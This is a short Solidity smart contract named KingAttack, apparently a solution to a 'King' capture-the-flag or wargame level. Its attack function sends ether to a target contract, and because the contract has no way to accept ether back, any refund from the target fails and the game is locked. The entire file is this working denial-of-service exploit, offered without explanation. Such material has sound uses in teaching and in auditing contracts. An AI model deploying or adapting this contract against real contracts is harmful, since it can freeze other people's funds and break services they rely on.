// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttack {
    event Response(int x);

    function attack(address payable _contract) public payable {
        (bool result, ) = _contract.call.value(msg.value)("");
        if (result) {
            emit Response(1234);
        } else {
            emit Response(5678);
        }
    }
}